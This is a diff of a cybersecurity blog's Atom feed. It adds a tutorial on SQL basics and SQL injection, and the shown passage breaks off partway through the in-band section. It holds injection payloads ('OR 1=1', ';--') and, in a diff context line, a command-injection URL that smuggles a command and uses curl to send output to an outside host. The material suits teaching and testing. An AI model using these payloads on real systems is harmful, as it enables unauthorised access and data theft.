@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-03T16:00:30-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-04T11:24:44-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
 That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>
@@ -438,7 +438,839 @@ http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(
   <li>
     <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
   </li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_evil_computer_hackers_degen_dark_det_in_the_style_of_cr_6984d0d8-875c-4a2e-83b9-d3b30ff721f1.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+
+<h1 id="sql-structured-query-language">SQL (Structured Query Language)</h1>
+<hr />
+
+<p>SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called <strong>statements</strong>.</p>
+
+<p>In this guide, we’ll stick with <strong>MySQL-style syntax</strong>. It’s important to know SQL is <strong>not case-sensitive</strong>, so commands like <code class="language-plaintext highlighter-rouge">SELECT</code>, <code class="language-plaintext highlighter-rouge">select</code>, and <code class="language-plaintext highlighter-rouge">SeLeCt</code> all behave the same.</p>
+
+<hr />
+
+<h2 id="select--retrieving-data"><strong>SELECT – Retrieving Data</strong></h2>
+
+<p>Let’s say we have a table named <code class="language-plaintext highlighter-rouge">books</code>.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books;
+</code></pre>
+</div>
+
+<p>This pulls all columns and rows from the <code class="language-plaintext highlighter-rouge">books</code> table.</p>
+
+<h3 id="sample-output">Sample Output:</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>id</th>
+      <th>title</th>
+      <th>author</th>
+      <th>genre</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Cyber Shadows</td>
+      <td>Max Hollow</td>
+      <td>Thriller</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Datafall</td>
+      <td>Mira Grant</td>
+      <td>Sci-Fi</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Broken Protocol</td>
+      <td>L. Pierce</td>
+      <td>Mystery</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>To return only certain columns:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select title, author from books;
+</code></pre>
+</div>
+
+<h3 id="output">Output:</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>title</th>
+      <th>author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Cyber Shadows</td>
+      <td>Max Hollow</td>
+    </tr>
+    <tr>
+      <td>Datafall</td>
+      <td>Mira Grant</td>
+    </tr>
+    <tr>
+      <td>Broken Protocol</td>
+      <td>L. Pierce</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="limit--restricting-results"><strong>LIMIT – Restricting Results</strong></h2>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books limit 2;
+</code></pre>
+</div>
+
+<p>Returns the first <strong>2 rows</strong> from the table.</p>
+
+<p>To skip rows:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books limit 1,2;
+</code></pre>
+</div>
+
+<p>This skips the first row and returns the next two.</p>
+
+<hr />
+
+<h2 id="where---filtering-data"><strong>WHERE - Filtering Data</strong></h2>
+
+<p>Use <code class="language-plaintext highlighter-rouge">WHERE</code> to fetch rows based on conditions:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books where genre = 'Thriller';
+</code></pre>
+</div>
+
+<h3 id="output-1">Output:</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>id</th>
+      <th>title</th>
+      <th>author</th>
+      <th>genre</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Cyber Shadows</td>
+      <td>Max Hollow</td>
+      <td>Thriller</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Use <code class="language-plaintext highlighter-rouge">!=</code> to exclude:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books where genre != 'Thriller';
+</code></pre>
+</div>
+
+<p>Use <code class="language-plaintext highlighter-rouge">OR</code> and <code class="language-plaintext highlighter-rouge">AND</code> to stack conditions:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books where genre = 'Sci-Fi' or genre = 'Mystery';
+</code></pre>
+</div>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books where author = 'Mira Grant' and genre = 'Sci-Fi';
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="like--pattern-matching"><strong>LIKE – Pattern Matching</strong></h2>
+
+<p>Use <code class="language-plaintext highlighter-rouge">LIKE</code> with <code class="language-plaintext highlighter-rouge">%</code> as a wildcard.</p>
+
+<p><strong>Starts with</strong>:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books where author like 'M%';
+</code></pre>
+</div>
+
+<p>Returns rows where the author starts with “M”.</p>
+
+<p><strong>Ends with</strong>:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books where title like '%l';
+</code></pre>
+</div>
+
+<p><strong>Contains</strong>:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select * from books where title like '%ro%';
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="union--merging-results-from-multiple-tables"><strong>UNION – Merging Results from Multiple Tables</strong></h2>
+
+<p>Say we have a <code class="language-plaintext highlighter-rouge">books</code> table and a <code class="language-plaintext highlighter-rouge">magazines</code> table:</p>
+
+<h3 id="books-table"><code class="language-plaintext highlighter-rouge">books</code> Table:</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>title</th>
+      <th>author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Cyber Shadows</td>
+      <td>Max Hollow</td>
+    </tr>
+    <tr>
+      <td>Datafall</td>
+      <td>Mira Grant</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="magazines-table"><code class="language-plaintext highlighter-rouge">magazines</code> Table:</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>title</th>
+      <th>editor</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>HackWorld Monthly</td>
+      <td>Erin Voss</td>
+    </tr>
+    <tr>
+      <td>Tech Digest</td>
+      <td>Dan Irvine</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Combine both into one list:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+select title, author from books union select title, editor from magazines;
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="insert--adding-data"><strong>INSERT – Adding Data</strong></h2>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+insert into books (title, author, genre) values ('Echoes of Null', 'J. Drayke', 'Cyberpunk');
+</code></pre>
+</div>
+
+<p>Now <code class="language-plaintext highlighter-rouge">books</code> has a new row:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>id</th>
+      <th>title</th>
+      <th>author</th>
+      <th>genre</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>4</td>
+      <td>Echoes of Null</td>
+      <td>J. Drayke</td>
+      <td>Cyberpunk</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="update--modifying-data"><strong>UPDATE – Modifying Data</strong></h2>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+update books set genre = 'Tech Noir' where title = 'Echoes of Null';
+</code></pre>
+</div>
+
+<p>Changes the genre of one specific book.</p>
+
+<hr />
+
+<h2 id="delete--removing-data"><strong>DELETE – Removing Data</strong></h2>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+delete from books where author = 'Max Hollow';
+</code></pre>
+</div>
+
+<p>Deletes all books by Max Hollow.</p>
+
+<p>Or wipe the table:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+delete from books;
+</code></pre>
+</div>
+
+<p>All rows gone but the table still exists.</p>
+
+<h1 id="what-is-sql-injection-sqli">What is SQL Injection (SQLi)?</h1>
+<hr />
+
+<p><strong>SQL Injection (SQLi)</strong> is a vulnerability that occurs when an application takes <strong>user input</strong> and drops it directly into an <strong>SQL query</strong> without proper validation or sanitization. This opens the door for attackers to <strong>manipulate the query</strong> and extract, bypass, or destroy data.</p>
+
+<p>It’s like handing your database a loaded gun… and letting the user pull the trigger.</p>
+
+<hr />
+
+<h2 id="real-world-example--the-blog-post-trap">Real-World Example – The Blog Post Trap</h2>
+
+<p>Let’s imagine a blog site where each post has a unique ID. Posts may be <em>public</em> (ready to read) or <em>private</em> (still in draft).</p>
+
+<p>A standard blog post URL might look like this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+https://cyberjournal.io/post?id=4
+</code></pre>
+</div>
+
+<p>Under the hood, the backend may run an SQL query like this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT * FROM posts WHERE id=4 AND is_public=1 LIMIT 1;
+</code></pre>
+</div>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">id=4</code> — tells the database which post to fetch.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">is_public=1</code> — filters out private drafts.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">LIMIT 1</code> — ensures only one row is returned.</p>
+  </li>
+</ul>
+
+<p>If <code class="language-plaintext highlighter-rouge">post 4</code> is public, you see it. If it’s private (<code class="language-plaintext highlighter-rouge">is_public=0</code>), you get a “not found” page.</p>
+
+<hr />
+
+<h2 id="where-it-breaks-injecting-malicious-input">Where It Breaks Injecting Malicious Input</h2>
+
+<p>Here’s the catch: if the <strong><code class="language-plaintext highlighter-rouge">id</code></strong> parameter is used directly in the query without filtering it’s open to abuse.</p>
+
+<p>Let’s say <code class="language-plaintext highlighter-rouge">post 7</code> is a private draft.</p>
+
+<p>You try this URL:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+https://cyberjournal.io/post?id=7
+</code></pre>
+</div>
+
+<p>You get nothing, as expected.</p>
+
+<p>But what if you sneak in this instead?</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+https://cyberjournal.io/post?id=7 OR 1=1
+</code></pre>
+</div>
+
+<p>Now the SQL query becomes:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT * FROM posts WHERE id=7 OR 1=1 AND is_public=1 LIMIT 1;
+</code></pre>
+</div>
+
+<p>Due to logical operator precedence, <code class="language-plaintext highlighter-rouge">1=1</code> evaluates as true bypassing the intent of the filter. But more dangerously, some devs might write queries like this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT * FROM posts WHERE id=$id;
+</code></pre>
+</div>
+
+<p>And now, you pass:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+https://cyberjournal.io/post?id=7;--
+</code></pre>
+</div>
+
+<p>That transforms the SQL into:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+SELECT * FROM posts WHERE id=7;--
+</code></pre>
+</div>
+
+<p><code class="language-plaintext highlighter-rouge">--</code> is the SQL comment syntax. It disables anything after it. So if the app tried to append <code class="language-plaintext highlighter-rouge">AND is_public=1</code>, it gets ignored.</p>
+
+<p>You now view a private post.</p>
+
+<hr />
+
+<h2 id="️-why-this-happens">⚙️ Why This Happens</h2>
+
+<p>It all boils down to <strong>trusting user input</strong>. SQL engines don’t care where the data comes from they just execute the final string. If the app doesn’t escape or bind inputs safely, attackers write their own logic inside your query.</p>
+
+<h1 id="in-band-sql-injection-one-path-in-one-path-out">In-Band SQL Injection: One Path In. One Path Out.</h1>
+<hr />
+
+<p><strong>In-Band SQLi</strong> is the <em>loudest</em>, <em>simplest</em>, and <em>most direct</em> form of SQL Injection. It’s called “In-Band” because:</p>
+
+<blockquote>
+  <p>The <strong>request</strong> and <strong>response</strong> both travel the <strong>same channel</strong> usually the web browser.</p>
+</blockquote>
+
+<p>You shoot the payload ➜ the app executes it ➜ the results spill out right on the page.</p>
+
+<p>It’s fast. It’s obvious. And if it works, you’re basically jacked into the DB like it’s 1999.</p>
+
+<hr />
+
+<h3 id="use-case-comment-viewer">Use Case: Comment Viewer</h3>
+
+<p>Imagine a basic URL:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+https://comments.sys/view.php?cid=10
+</code></pre>
+</div>
+
+<p>The backend query might look like:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
